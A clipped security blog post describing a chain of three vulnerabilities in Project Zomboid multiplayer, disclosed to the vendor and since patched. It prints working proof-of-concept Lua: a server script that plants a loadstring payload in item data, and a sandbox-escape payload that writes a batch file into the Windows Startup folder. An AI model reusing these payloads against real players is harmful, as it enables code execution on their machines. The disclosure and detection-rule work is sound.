---
title: Chaining multiple vulnerabilities in Project Zomboid to execute code on a multiplayer client
source: https://blog.nns.ee/2026/08/26/project-zomboid-vulns/
source_host: blog.nns.ee
clip_date: 2026-11-02T10:20:28+08:00
trace_id: 9920abdd-1c19-4644-8661-55978b453dc1
content_hash: a85a09ae78c41d337afd43284f409cd8ddf1ce40e1256210fbedba1ccb25a9ac
status: synced
tags:
  - 游戏安全
  - 漏洞分析
series: null
feed_source: nns.ee·Android/漏洞研究
ai_summary: Project Zomboid Build 42 多人模式存在三个可串联的漏洞，恶意服务器可在连接客户端（42.20.3）上实现任意代码执行。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 40c75244-d011-8168-b938-ccfca75cbb4f
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Project Zomboid Build 42 多人模式存在三个可串联的漏洞，恶意服务器可在连接客户端（42.20.3）上实现任意代码执行。
> 
> - **任意 Lua 执行（漏洞1）：** `PrintMedia.lua` 用 `loadstring("return " .. value)` 解析物品 `modData.printMedia.info` 中的键值；服务器可改写玩家背包任意物品的 modData，玩家阅读该物品即触发客户端执行 Lua。payload 不能含 `:` `,` `<` `>` `%`，用 `string.char()` 构造字符即可绕过。
> - **Lua 沙箱逃逸（漏洞2）：** 客户端 Lua 沙箱（基于 Kahlua，含反射/Runtime 黑名单）本可阻止危害，但 `AttachmentEditorState.updateScript()` 可从 Lua 调用，它把列表原样传给被 `@HiddenFromLua` 保护的 `writeScript()`，且仅重写匹配 `module` 的最后一个 token，之前的 token 原封不动写入文件，形成任意内容写盘原语。
> - **路径规范化缺陷（漏洞3）：** `normalizeToPath()` 先 `normalize()` 后 `toAbsolutePath()`，而 `normalize()` 无法消除开头的 `..`；`validatePrefix()` 用组件级 `startsWith` 校验，相对路径 `<安装目录>/../../../...` 检查直接通过（绝对路径遍历则被正确拦截），可写到任意位置。
> - **完整利用链：** 服务器入服时发漫画书并污染其 modData → 玩家阅读触发 Lua payload → 写 `pz-pwn.bat` 到 Windows 启动目录 → 下次登录执行 `calc.exe`；目前需一次用户交互（阅读物品）。
> - **修复与后续：** 2026-08-26 各分支发布补丁（42.20.4 / 42.19.2 / 41.78.21），PoC 失效，官方一度移除 `loadstring`/`loadstream`；42.21 又为 mod 重新启用，作者建议用 ast-grep/semgrep 排查 mod 中动态构造的 `loadstring` 调用。

Project Zomboid recently released their long-awaited Build 42. I set out to see if I can discover any vulnerabilities in the multiplayer component of the game. I ended up discovering three distinct vulnerabilities which allow a malicious server to execute code on connecting clients in Project Zomboid 42.20.3.

### Background

Project Zomboid is a sandbox-based zombie survival game that's been in development for at least 15 years now. I enjoy the game - it's worth checking out if you're into isometric RPG-ish sandbox survival games.

While porting a mod of mine to the recent release of Build 42, the latest version of the game, I wondered whether the multiplayer component is sound.

PZ uses a bespoke engine written in Java, with much of the game logic implemented with Lua scripts. While the game ships compiled Java bytecode, it's trivial to decompile the game using something like the [ZomboidDecompiler](https://github.com/demiurgeQuantified/ZomboidDecompiler) project (based on the [Vineflower](https://github.com/Vineflower/vineflower) Java decompiler) and is very commonly performed by anyone developing mods for the game. This makes the engine trivial to inspect.

### Vulnerability 1: Arbitrary Lua execution

I decided to start off inspecting the Lua side of the game to see if any server-supplied scripts or input is processed by the client (or vice versa). The obvious place to start when looking for something like this in any interpreted language is the `eval` function, which interprets and executes strings as source code. In Lua, the equivalent function is called [`loadstring()`](https://www.lua.org/pil/8.html).

Grepping for `loadstring` landed me a few interesting results. What immediately caught my eye was `PrintMedia.lua`, which parses a form of rich-text grammar and seemed to be constructing `loadstring` calls with dynamically built arguments:

```lua
 93:  local val2 = loadstring("return " .. value)()  -- type=parent, width
 96:  local val2 = loadstring("return " .. value)()  -- type=parent, height
105:  self.children["element_"..i][key] = loadstring("return " .. value)()  -- type=text
124:  self.children["element_"..i][key] = loadstring("return " .. value)()  -- type=texture
```

Tracing up where these functions are called, it became apparent that the keys were a part of the item data (`modData`).

The `loadstring` calls themselves were performed as an ordinary game action - reading a piece of literature. Some pieces of literature (fliers, newspapers, etc) create an in-game window showing the piece of literature:

[![In-game screenshot of a Chili restaurant](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3b312d5e22552cf5.png)](https://blog.nns.ee/img/2026-08-26-project-zomboid-vulns/chili-flier.png)

The width and height of the window, for example, are encoded in the item's `modData`, specifically its `printMedia.info` field, encoded as a `<key:val,key:val>` string - as a more complete example: `<type:parent,width:480,height:600>`.

It turns out the server is fully capable of modifying the `modData` of any item in a player's inventory. This makes it trivial for the server to force the client to execute arbitrary Lua code. For example, by setting an item's `modData.printMedia.info` to `<type:parent,width:(function() print('PWN') end)() or 480>`, when the player inspects the item, the client's game runs `loadstring("return (function() print('PWN') end)() or 480")`, which prints the string `PWN` in the client's console/logs.

It is a bit fiddly - the payload can't contain the characters `:`, `,`, `<` or `>`, as those break the expected syntax and the `printMedia.info` line isn't parsed at all. It also can't contain `%` due to some formatting reasons that I didn't fully dig into. However, this is fairly trivial to bypass by simply calling `string.char()` in the payload in place of using the symbols literally.

A more complete example of server-side Lua which attaches the `print('PWN')` payload to literature in every player's inventory:

```lua
local PAYLOAD = "<type:parent,width:(function() print('PWN') end)() or 480>"
local TARGET_TYPES = {
    ["Base.Magazine"]  = true,
    ["Base.ComicBook"] = true,
}

local function arm()
    local players = getOnlinePlayers()
    if not players then return end

    for i = 0, players:size() - 1 do
        local player = players:get(i)
        local items = player:getInventory():getItems()
        for j = 0, items:size() - 1 do
            local item = items:get(j)
            if TARGET_TYPES[item:getFullType()] then
                local md = item:getModData()
                md.printMedia = {
                    id    = "attacker",
                    title = "Test Paper",
                    text  = "Nothing to see here.",
                    info  = PAYLOAD,
                }
                md.literatureTitle = "Test Paper"

                syncItemModData(player, item)
                break
            end
        end
    end
end

Events.EveryOneMinute.Add(arm)
```

### Vulnerability 2: Lua sandbox escape

I wasn't entirely surprised to find out that the Lua code that runs in the client is confined to a sandbox. The developers have taken Kahlua, a Java implementation of a Lua VM, and added additional safeguards to prevent executing arbitrary Java directly or performing any disk I/O outside the Zomboid-related directories.

The sandbox does expose some Java objects directly, but has a deliberate allowlist of classes *in addition to* a denylist preventing access to objects like `Class`, `ClassLoader`, `java.lang.reflect.*`, `java.lang.invoke.*`, `Runtime`, etc, which block classic reflection escapes.

Generally, the developers seem to have taken care that executed Lua code can't do anything dangerous, so in order to make my Lua execution vulnerability useful, I had to find a bypass.

Grepping through Java functions that could potentially write arbitrary content to disk, I stumbled upon `writeScript()` in `AttachmentEditorState.java`:

```java
@HiddenFromLua
private static boolean writeScript(String fileName, ArrayList<String> tokens) {
    String absolutePath = ZomboidFileSystem.instance.getString(fileName);
    ZomboidFileSystem.instance.validatePrefix(absolutePath);
    File file = new File(absolutePath);

    try (
        FileWriter fw = new FileWriter(file);
        BufferedWriter br = new BufferedWriter(fw);
    ) {
        DebugType.General.printf("writing %s\n", fileName);

        for (String token : tokens) {
            br.write(token);
        }

        return true;
    } catch (Throwable t) {
        ExceptionLogger.logException(t);
        return false;
    }
}
```

Someone clearly thought about this method - it's annotated `@HiddenFromLua` (meaning it can't be called from Lua directly), marked `private` and the body validates the path before attempting to write anywhere.

This, however, is almost completely defeated by the fact that `writeScript()` is called by `updateScript()` in the same file, which is entirely accessible from Lua:

```java
public static boolean updateScript(String fileName, ArrayList<String> tokens, ModelScript modelScript);
```

I'm not going to paste the whole function here, but it should be noted that the function *does* mutate the `tokens` ArrayList before passing it to `writeScript()`:

```java
for (int i = tokens.size() - 1; i >= 0; i--) {
    String token = tokens.get(i).trim();
    int firstOpen = token.indexOf("{");
    String header = token.substring(0, firstOpen);
    if (header.startsWith("module")) {
        ...
            if (scriptName.equals(modelScript.getName())) {
                tokens.set(i, moduleStr); // only THIS token is rewritten
                return writeScript(fileName, tokens); // ... but all of them are written
```

A few things to note here:

-   Only the one matching `module` token is rewritten, while every other list element passes through verbatim
-   It iterates backwards and returns on the first match, which means we can put the matching module token last and arbitrary content first
-   Any token it inspects needs to contain `{`, but since the module token is last and matches immediately, earlier tokens are never inspected in the first place

This could be a very powerful write primitive, but at first I disregarded it due to the fact that the `writeScript()` method calls `validatePrefix()`, which seems to restrict file access to only the PZ-related directories. From `ZomboidFileSystem.java`:

```java
public void validatePrefix(String input) {
    Path inputPath = normalizeToPath(input);
    List<Path> allowedPrefixes = this.allowedPrefixes.get();
    int size = allowedPrefixes.size();

    for (int i = 0; i < size; i++) {
        Path allowedPrefix = allowedPrefixes.get(i);
        if (inputPath.startsWith(allowedPrefix)) {
            return;
        }
    }

    throw new IllegalArgumentException("Invalid prefix found for: %s".formatted(input));
}
```

That is, until I took a closer look at `normalizeToPath()`...

### Vulnerability 3: How does normalization work, anyways?

`normalizeToPath()` is defined just above `validatePrefix()`, and is actually super short:

```java
private static Path normalizeToPath(String path) {
    return Path.of(Path.of(path).normalize().toAbsolutePath().toString().toLowerCase());
}
```

The astute reader might've noticed that `normalize()` is called *before* `toAbsolutePath()` and never again after.

The problem here is that `Path.normalize()` cannot remove a leading `..`. It has no base to resolve it against, so calling `Path.of("../x").normalize()` still returns `../x`.

Then, `toAbsolutePath()` prepends the working directory verbatim, which produces `<cwd>/../x` with the `..` component still present. Nothing normalizes it again.

Then, looking back at `validatePrefix()`:

```java
if (inputPath.startsWith(allowedPrefix)) return;
...
throw new IllegalArgumentException(...);
```

`Path.startsWith()` works component-wise. If the `allowedPrefixes` list contains the install dir, and we give it `<install dir>/../../../etc/x`, then that path genuinely starts with the install dir and the check passes. The filesystem then resolves the `..` as you would expect and the write lands wherever the attacker aimed.

It should be noted that an *absolute* path traversal attempt (`<install dir>/../outside`) is correctly refused, because `normalize()` actually has a base there and the function does its job correctly, but totally fails on relative inputs.

To weaponize this in order to get code execution is fairly trivial. On a Windows machine, you could traverse to the Startup directory and write a malicious batch file there.

As an example, I wrote the following Lua code, which abuses the described vuln to write `pz-pwn.bat` to the Startup folder, which runs `calc.exe` when executed:

```lua
local zomboid = getMyDocumentFolder()
local profile = string.gsub(zomboid, "[\\/][^\\/]*$", "")
local rel = string.gsub(profile, "^%a:[\\/]", "")
local up = "../../../../../../../../"
local startup = up .. rel .. "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
local target = startup .. "pz-pwn.bat"
local bat = '@echo off\r\nrem {\r\nstart "" calc.exe\r\nexit /b\r\n'
local ms = getScriptManager():getAllModelScripts():get(0)
local tokens = java.util.ArrayList.new()
tokens:add(bat)
tokens:add("module " .. ms:getModule():getName() .. "\n{\n\tmodel " .. ms:getName() .. "\n\t{\n\t\tmesh = x,\n\t}\n}")
local ok = zombie.gameStates.AttachmentEditorState.updateScript(target, tokens, ms)
print("hi! PWN startup write=" .. tostring(ok) .. " -> " .. target)
```

### Putting it all together

Chaining all of these vulnerabilities together, I created a vanilla server which:

1.  Gives the player a comic book upon joining
2.  Uses a Lua script to set the `modData` of comic books in players' inventories, abusing vuln 1 to gain Lua code execution
3.  When the player reads the comic book, it runs the Lua payload
4.  The Lua payload abuses vulns 2 and 3 to write `pz-pwn.bat` to the victim's startup directory
5.  The batch file is executed the next time the Windows user logs in, running `calc.exe`

A screen recording of this entire chain in action can be seen here: [https://youtu.be/aMOM1SdCAsg](https://youtu.be/aMOM1SdCAsg).

Currently, the chain requires *some* user interaction (inspecting the comic book) for the Lua to execute and the rest of the payload to continue. It might be possible for the server to force the player to do this automatically as soon as they join the server, but I haven't figured out a way to trigger this from the server side.

* * *

### 26/08/2026 patches

On 26/08/2026, the developers [released security patches](https://theindiestone.com/forums/topic/100509-42204-stable-42192-unstable-417821-legacy-hotfixes-released/) across multiple branches to fix the issues described in this post.

The patched versions for each branch are:

-   Stable - 42.20.4
-   Unstable - 42.19.2
-   Legacy - 41.78.21

I haven't validated these patches in-depth, but at least the PoC I demonstrated no longer works as-is. Notably, they removed Lua access to the `loadstring` (and `loadstream`) methods entirely.

* * *

### 42.21 update

On 28/09/2026, the developers [released Project Zomboid version 42.21](https://projectzomboid.com/blog/news/2026/09/42-21-stable-released/), which re-enables the `loadstring` and `loadstream` methods for mods:

> In 42.20.4 the “loadstring” and “loadstream” lua methods were disabled to help address security vulnerabilities. After investigating further into the security issue, we’ve decided to re-enable those commands. Sorry for the disruption, modders/server admins!

The vulnerabilities themselves are patched, and re-enabling these methods doesn't necessarily mean it introduces new vulnerabilities if used correctly. However, it should be kept in mind that while I've checked this for the vanilla game, it's likely that commonly used mods might have injection vulnerabilities in `loadstring` calls.

If you're curious, I recommend grepping your mods for `load` and `loadstring` calls where the input is dynamically constructed. If you're using [ast-grep](https://github.com/ast-grep/ast-grep) (which I highly recommend checking out if you haven't already), you can use the following rule:

```yaml
id: lua-loadstring-dynamic
language: lua
severity: warning
message: loadstring/load called with a non-literal chunk
rule:
  kind: function_call
  all:
    - has:
        field: name
        regex: ^(load(string)?)$
    - not:
        has:
          field: arguments
          has:
            nthChild: 1
            kind: string
```

[semgrep](https://github.com/semgrep/semgrep) also works great for this (and also does constant folding, so might produce fewer false positives).

On 21/10/2026, the developers [published a blog post](https://projectzomboid.com/blog/news/2026/10/a-note-on-java-mods-and-modding/) concerning modding and security, specifically highlighting non-workshop Java mods as being potentially dangerous as they naturally run outside the Lua sandbox.

* * *

### Timeline

-   **18/08/2026** - Sent initial vulnerability report to vendor (The Indie Stone)
-   **20/08/2026** - Initial response from vendor confirming they've received the report and are investigating
-   **24/08/2026** - Response from vendor indicating they're finalizing the security patches
-   **26/08/2026** - Patched versions released across multiple branches
-   **26/08/2026** - Article published
